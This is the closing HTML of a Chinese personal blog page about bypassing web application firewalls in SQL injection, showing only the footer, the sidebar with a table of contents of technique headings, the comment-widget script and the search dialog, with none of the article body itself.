</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://king-xyp.github.io">沐风</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://king-xyp.github.io/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/">http://king-xyp.github.io/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://king-xyp.github.io" target="_blank">沐风的blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/11/%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="漏洞汇总"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">漏洞汇总</div></div><div class="info-2"><div class="info-item-1">描述TOP10相关漏洞原理等</div></div></div></a><a class="pagination-related" href="/2025/09/08/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL注入</div></div><div class="info-2"><div class="info-item-1">SQL注入相关内容</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/08/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-08</div><div class="info-item-2">SQL注入</div></div><div class="info-2"><div class="info-item-1">SQL注入相关内容</div></div></div></a><a class="pagination-related" href="/2025/09/11/%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="漏洞汇总"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-11</div><div class="info-item-2">漏洞汇总</div></div><div class="info-2"><div class="info-item-1">描述TOP10相关漏洞原理等</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">沐风</div><div class="author-info-description">知识是一切的基础</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/king-xyp"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95WAF%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">SQL注入绕WAF介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-number">2.1.</span> <span class="toc-text">等价替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%92%88%E5%AF%B9%E5%8D%95%E4%B8%AA%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.针对单个关键字的绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8D%95%E6%AC%A1%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.单次编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8F%8C%E9%87%8D%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.3.</span> <span class="toc-text">3.双重编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Unicode%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.4.</span> <span class="toc-text">4.Unicode编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#N%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">N写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">空格字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">2.7.</span> <span class="toc-text">更改请求方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93"><span class="toc-number">2.8.</span> <span class="toc-text">分块传输</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">2.9.</span> <span class="toc-text">参数污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">2.10.</span> <span class="toc-text">缓冲区溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%B7%B7%E6%B7%86"><span class="toc-number">2.11.</span> <span class="toc-text">随机数混淆</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/28/MPLS%E8%AF%A6%E8%A7%A3/" title="MPLS详解">MPLS详解</a><time datetime="2026-02-28T14:46:32.000Z" title="发表于 2026-02-28 22:46:32">2026-02-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/11/%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="漏洞汇总">漏洞汇总</a><time datetime="2025-09-11T08:04:49.000Z" title="发表于 2025-09-11 16:04:49">2025-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/" title="SQL注入绕waf">SQL注入绕waf</a><time datetime="2025-09-11T01:44:45.000Z" title="发表于 2025-09-11 09:44:45">2025-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/08/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2025-09-08T01:23:09.000Z" title="发表于 2025-09-08 09:23:09">2025-09-08</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 沐风</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'iPU4vfkFLB3OW9ntYe6GyKzn-gzGzoHsz',
      appKey: 'hVKfOjbimykva25sbr6SeSXu',
      avatar: 'monsterid',
      serverURLs: 'https://ipu4vfkf.lc-cn-n1-shared.com',
      emojiMaps: "",
      visitor: true,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !true) {
    if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="输入关键词…" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>